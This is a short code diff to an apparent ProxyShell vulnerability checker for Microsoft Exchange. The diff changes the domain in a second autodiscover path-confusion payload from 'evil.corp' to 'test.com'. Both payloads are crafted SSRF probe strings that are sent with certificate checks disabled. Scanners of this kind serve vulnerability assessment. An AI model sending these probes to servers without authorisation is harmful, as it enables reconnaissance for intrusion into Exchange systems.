@@ -16,7 +16,7 @@ headers = {
 def proxyshell_check(url):
     url = url.strip()
     payload = "/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com"
-    payload2 = "/autodiscover/autodiscover.json?@evil.corp/ews/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@evil.corp"
+    payload2 = "/autodiscover/autodiscover.json?@test.com/ews/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@test.com"
     
     try:
         with requests.get("https://{url}{payload}".format(url=url, payload=payload), allow_redirects=True, timeout=20, verify=False, headers=headers) as response:           
